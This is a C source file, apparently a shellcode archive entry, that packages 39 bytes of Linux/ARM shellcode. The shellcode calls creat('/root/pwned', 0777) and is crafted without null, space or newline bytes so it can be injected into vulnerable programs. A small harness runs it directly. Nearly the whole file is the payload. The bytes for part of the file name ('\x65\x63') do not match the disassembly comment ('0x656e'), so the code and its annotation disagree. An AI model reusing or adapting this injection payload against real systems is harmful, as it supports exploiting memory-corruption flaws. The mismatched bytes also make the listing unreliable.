/*
    Title       : Linux/ARM - creat("/root/pwned", 0777) - 39 bytes
    Date        : 2013-09-04
    Author      : gunslinger_ (yuda at cr0security dot com)
    Tested on   : ARM1176 rev6 (v6l)

    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.

    Cr0security.com

*/
#include <stdio.h>

char *shellcode = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                  "\x16\xff\x2f\xe1"    // bx   r6
                  "\x78\x46"            // mov  r0, pc
                  "\x10\x30"            // adds r0, #16
                  "\xff\x21"            // movs r1, #255    ; 0xff
                  "\xff\x31"            // adds r1, #255    ; 0xff
                  "\x01\x31"            // adds r1, #1
                  "\x08\x27"            // adds r7, #8
                  "\x01\xdf"            // svc  1
                  "\x40\x40"            // eors r0, r0
                  "\x01\x27"            // movs r7, #1
                  "\x01\xdf"            // svc  1
                  "\x2f\x72\x6f\x6f"    // .word    0x6f6f722f
                  "\x74\x2f\x70\x77"    // .word    0x77702f74
                  "\x65\x63"            // .short   0x656e
                  "\x64";               // .byte    0x64

int main(){
    fprintf(stdout,"Shellcode length: %d\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}